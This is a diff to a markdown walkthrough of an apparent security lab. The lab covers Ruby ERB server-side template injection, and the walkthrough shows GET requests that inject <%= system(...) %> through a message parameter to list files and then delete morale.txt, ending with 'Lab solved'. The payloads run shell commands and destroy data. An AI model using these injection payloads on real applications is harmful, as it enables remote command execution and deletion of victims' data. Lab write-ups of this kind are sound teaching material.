@@ -25,21 +25,21 @@ system("ls")
 Request:
 GET /?message=<%= system("ls") %>
 ```
-
+```
 Response:
-morale.txt
-true
-
+morale.txt true
+```
+### The exploit:
 ```Ruby
 <%= system("rm morale.txt") %>
 ```
 
+## Request
 ```HTTP
-Request:
 GET /?message=<%= system("rm morale.txt") %>
 ```
 
-Response:
+## Response:
 Lab solved
 
 
